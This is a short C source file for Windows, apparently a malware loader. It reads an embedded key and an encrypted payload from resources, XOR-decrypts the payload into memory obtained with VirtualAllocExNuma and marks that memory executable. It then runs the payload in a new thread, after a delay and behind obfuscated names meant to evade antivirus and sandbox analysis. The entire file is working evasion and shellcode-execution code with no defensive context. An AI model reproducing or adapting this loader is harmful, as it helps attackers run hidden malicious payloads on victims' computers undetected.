
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void resloamadappa(const char* enapparename, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, enapparename, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}


int main() {
    Sleep(2500);

    char* keu789;
    DWORD keu789Len;
    resloamadappa("dhanushkey1", &keu789, &keu789Len);

    char* kkcode;
    DWORD kkcodeLen;
    resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);

    LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    for (DWORD a = 0; a < kkcodeLen; a++) {
        kkcode[a] ^= keu789[a % keu789Len]; 
    }

    memcpy(sirajpura, kkcode, kkcodeLen);
    DWORD oldProtect;
    VirtualProtect(sirajpura, kkcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sirajpura, NULL, 0, NULL);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;
}
